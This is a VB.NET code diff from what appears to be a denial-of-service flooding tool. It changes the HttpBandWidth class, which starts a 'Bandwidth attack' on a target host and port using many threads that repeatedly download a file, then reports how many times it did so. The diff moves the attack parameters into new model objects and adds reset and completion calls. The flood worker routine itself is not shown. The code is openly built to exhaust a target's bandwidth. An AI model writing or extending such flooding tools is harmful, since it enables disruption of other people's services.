@@ -20,15 +20,16 @@ Public Class HttpBandWidth
     Public Sub New(ByVal model As HttpBandWidthModel)
         If Not AttackRunning = True Then
             AttackRunning = True
-            CutURL(model.Host)
-            Method = model.Method
-            ThreadstoUse = model.ThreadstoUse
-            TimetoAttack = model.Time
-            PostDATA = model.PostDATA
-            RandomFile = model.RandomFile
-            Port = model.Port
+            CutURL(model.newBaseFloodModel.Host)
+            Method = model.newHttpBandWidthVariables.Method
+            ThreadstoUse = model.newBaseFloodModel.ThreadstoUse
+            TimetoAttack = model.newBaseFloodModel.Time
+            PostDATA = model.newHttpBandWidthVariables.PostDATA
+            RandomFile = model.newHttpBandWidthVariables.RandomFile
+            Port = model.newHttpBandWidthVariables.Port
             Threads = New Thread(ThreadstoUse - 1) {}
-            GetFloodsBase().SetMessage("Bandwidth attack")
+            GetFloodsBase().Reset()
+            GetFloodsBase().SetMessage("Bandwidth attack started")
             For i As Integer = 0 To ThreadstoUse - 1
                 Threads(i) = New Thread(AddressOf DoWork)
                 Threads(i).IsBackground = True
@@ -50,6 +51,7 @@ Public Class HttpBandWidth
             AttackRunning = False
             GetFloodsBase().SetMessage("Bandwidth Flood on " & HostToAttack & " finished successfully, downloading the file " & attacks.ToString & " times.")
             attacks = 0
+            GetFloodsBase().SetEnd()
         End If
 
     End Sub
